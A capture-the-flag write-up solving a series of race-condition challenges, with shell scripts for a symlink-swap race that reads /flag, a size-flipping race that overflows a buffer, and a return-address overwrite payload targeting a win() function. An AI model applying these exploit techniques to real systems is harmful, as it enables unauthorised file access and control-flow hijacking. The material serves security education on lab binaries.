# Race Condition

## babyrace_level1.0

- Run a script that executes 3 commands repeatedly:

    ```shell
    touch my_file
    ln -sf /flag my_file
    rm my_file
    ```

## babyrace_level1.1

- There is no hint, try the same method, it works!

## babyrace_level2.0

- A race condition with a tighter timing window to read the flag. The script for level 1 still works!

## babyrace_level2.1

- Repeating the challenge manually is hard to get the flag, run another script that repeats the challenge automatically:
    ```shell
    #!/bin/bash

    # Usage: ./repeat_challenge.sh 2.1
    for i in {0..100000}
    do
        /challenge/babyrace_level$1 my_file | grep 'pwn'
    done
    ```

## babyrace_level3.0

- Corrupt memory by exploiting a race condition

    ```
    This challenge will verify that the file's path does not include "flag".
    This challenge will verify that the file is not a symlink.
    This challenge will verify that the file is not larger than 256 bytes.
    ```

- First, input a simple file, the hint is: `Value of "win" variable: 0`. The program limits the size of the input file to 256 bytes, I guess that with a larger file we can overwrite the value of `win` to non-zero

- Use a script to change the size of `my_file` repeatedly, and run the challenge for a few times

    ```shell
    #!/bin/bash

    touch my_file
    for i in {0..100000}
    do
        printf 'a%.0s' {1..900} > my_file
        printf '' > my_file
    done
    ```

## babyrace_level3.1

- Use the script in level 3.0

## babyrace_level4.0

- In this level, we cannot guess anymore. By inspecting the assembly code of the challenge (we can use `gdb` or some other tools), we can see that there is a `win()` function, but it is never invoked in `main()`. What we need to do is to exploit the race condition to overwrite the return address of `main()` to the address of `win()`
- Here is some useful information:
    - `&win=0x4012f6`
    - `&buffer=$rbp-0x190` (i.e., `&ret_addr=&buffer+0x198`)
- In the script, we need to prepare a file with payload: `"a"*408+"\xf6\x12\x40\x00\x00\x00"`

## babyrace_level4.1

- Find the return address, and overwrite it with the address of `win()`, just like level 4.1
- Use a script to repeat the challenge: `./repeat_challenge.sh 4.1 | grep "pwn"`
- Then, wait
